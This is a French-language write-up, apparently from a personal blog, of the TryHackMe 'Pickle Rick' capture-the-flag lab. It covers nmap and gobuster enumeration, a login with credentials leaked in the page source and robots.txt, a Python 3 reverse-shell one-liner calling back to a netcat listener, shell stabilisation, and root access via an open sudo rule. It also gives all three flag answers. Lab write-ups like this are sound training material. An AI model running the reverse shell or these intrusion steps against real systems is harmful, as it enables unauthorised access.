---
title: "Write-up : Pickle Rick sur TryHackMe"
date: 2025-12-05
draft: false
categories: ["writeups", "tryhackme"]
description: "Un CTF TryHackMe sur le thème de Rick et Morty ? Ça promet d'être fun !"
---

[Lien vers le CTF sur TryHackMe](https://tryhackme.com/room/picklerick)

Un CTF TryHackMe sur le thème de Rick et Morty ? Ça promet d'être fun ! 
Il semblerait que Rick s'est accidentellement transformé en cornichon lors de l'une de ses expériences. Il a besoin de quelqu'un pour trouver trois ingrédients sur le serveur. Ces derniers vont permettre de créer une potion qui le retransformera en humain. Je me lance !

## Analyse des ports ouverts sur le serveur

Première chose que je peux essayer de faire c'est d'analyser quels sont les ports ouverts sur le serveur. Pour ça, j'utilise `nmap` avec le paramètre `-p-` pour lui demander de scanner tous les ports de 1 à 65535. J'utilise aussi le paramètre `-oN [file]` pour sauvegarder le résultat du scan dans un fichier au cas où je voudrais le retrouver plus tard.

```bash
mkdir nmap
nmap -p- -oN nmap/allports.txt [ip]
```

![Résultat de nmap](/img/writeup-pickle-rick/nmap.png "Résultat de nmap")

Il semblerait qu'il y ai simplement une connexion SSH ouverte sur le port 22 et un serveur web sur le port 80.

## Analyse du serveur web

Je vais jeter une oeil au serveur web en ouvrant l'adresse ip sur Firefox.

Ça a l'air d'être un site web classique. Première chose que je peux faire c'est d'analyser le code source de la page. J'y ai trouvé un commentaire laissé par Rick me permettant d'avoir un premier nom d'utilisateur : `R1ckRul3s`. Je pourrais peut-être l'utiliser pour me connecter au serveur en SSH.

Comme il n'y a pas plus d'informations sur cette page d'accueil, je vais lancer `gobuster` pour tenter de trouver d'autres pages présentes sur le serveur web.

```bash
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt
```

![Résultat de gobuster](/img/writeup-pickle-rick/gobuster.png "Résultat de gobuster")

J'ai trouvé un dossier `/assets` dans lequel il n'y avait rien d'interessant, à part des images, bootstrap et jquery.

J'ai aussi jeté un oeil au `robots.txt` remonté par `gobuster` et j'y ai trouvé une information qu'on ne trouve pas souvent dans ce genre de fichier : `Wubbalubbadubdub`. Je garde ça de côté pour plus tard, ça pourra peut-être servir.

Rien de très intéréssant pour l'instant. Je vais tenter de relancer `gobuster` pour chercher cette fois-ci des fichiers `.php` sur le serveur web avec le paramètre `-x php`.

```bash
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt -x php
```

Bingo ! J'ai trouvé des pages très interessantes : `login.php`, `denied.php` et `portal.php`.

![Résultat de gobuster en mode php](/img/writeup-pickle-rick/gobuster-php.png "Résultat de gobuster en mode php")

Les pages `portal.php` et `denied.php` me redirigent toutes les deux vers `login.php`. Je vais donc me concentrer sur cette dernière. C'est une simple page qui me demande d'entrer un nom d'utilisateur et un mot de passe.

## Connexion au site web et premier ingrédient

Je vais analyser une fois de plus le code source de la page `login.php` pour essayer d'y trouver des informations... Rien d'interessant. J'ai tenté une connexion avec le nom d'utilisateur trouvé précédemment : `R1ckRul3s` et `Wubbalubbadubdub` comme mot de passe... Et ça a fonctionné ! Je suis connecté à la page `portal.php`.

Une fois de plus je vais analyser le code source de la page avant de commencer quoi que ce soit. J'y ai trouvé une information qui semble être encodée en `base64`.

```bash
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

Après avoir bidouillé avec [CyberChef](https://gchq.github.io/CyberChef), j'ai découvert qu'il s'agissait d'une phrase encodée 7 fois d'affilée en `base64` qui, une fois décodée, donne le résultat suivant : `rabbit hole`. Je me suis fait avoir, encore une blague de Rick pour me faire perdre du temps !

De retour sur la page `portal.php`, je me rend compte qu'il s'agit d'une interface de commande qui permet d'intéragir avec le serveur. En listant les fichiers présents dans le serveur avec `ls` je vois qu'il existe un fichier `Sup3rS3cretPickl3Ingred.txt`.

![Liste des fichiers présents sur le serveur](/img/writeup-pickle-rick/ls.png "Liste des fichiers présents sur le serveur")

Lorsque je tente un `cat Sup3rS3cretPickl3Ingred.txt` j'obtiens une erreur. Il semblerait que Rick ai désactivé certaines commandes pour empêcher les utilisateurs d'avoir un contrôle entier sur le serveur. Mais bon, comme il y a un serveur web qui tourne sur la machine, il me suffit d'ouvrir le fichier `/Sup3rS3cretPickl3Ingred.txt` dans Firefox pour découvrir son contenu : `mr. meeseek hair`. Premier ingrédient obtenu ! Il m'en reste deux à trouver.

## Accès au serveur via un reverse shell

Comme j'ai la possiblité d'éxécuter des commande sur le serveur, j'aimerai voir s'il existe un moyen d'y éxécuter un reverse shell pour avoir un réel accès.

En énumerant mes possiblités, j'ai éxécuté la commande `which python3` pour voir si Python 3 était installé sur le serveur, et c'est le cas ! La voilà ma porte d'entrée.

Je lance un serveur Netcat sur ma machine en écoute sur le port 4444.

```bash
nc -lvnp 4444
```

Il me reste plus qu'à trouver un reverse shell utilisant Python 3 grâce à [RevShells](https://www.revshells.com/), à l'éxécuter dans l'éxécution de commande présente sur le serveur web et le tour est joué.

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[ip]",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

Bingo ! Je suis connecté à la machine.

## Stabilisation du shell et second ingrédient

Comme je sais que Python 3 est installé, je vais prendre le temps de stabiliser le shell pour nottament avoir accès à l'autocomplétion de mes commandes.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

`CTRL + Z`

```bash
stty raw -echo; fg
```

Maintenant que c'est fait, je vais pouvoir prendre le temps d'analyser le serveur pour trouver les deux derniers ingrédients. En fouillant dans les dossiers principaux, j'ai eu accès au dossier personnel de Rick `/home/rick` et j'y ai trouvé le second ingrédient : `1 jerry tear`.

## Élévation des privilèges et troisième ingrédient 

En continuant mon exploration du serveur j'ai voulu voir si mon utilisateur avait des accès `sudo` sur certains fichiers ou programmes.

```bash
sudo -l
```

![Résultat sudo -l](/img/writeup-pickle-rick/sudo.png "Résultat de sudo -l")

Magnifique ! Il se trouve que le serveur est très mal configuré et que mon utilisateur `www-data` possède des accès complet en tant que super utilisateur. Il ne me reste plus qu'à passer sur l'utilisateur `root`.

```bash
sudo su
```

Maintenant que j'ai tous les accès sur le serveur, je peux me déplacer vers le dossier `/root` pour y trouver le troisième et dernier ingrédient : `fleeb juice`.

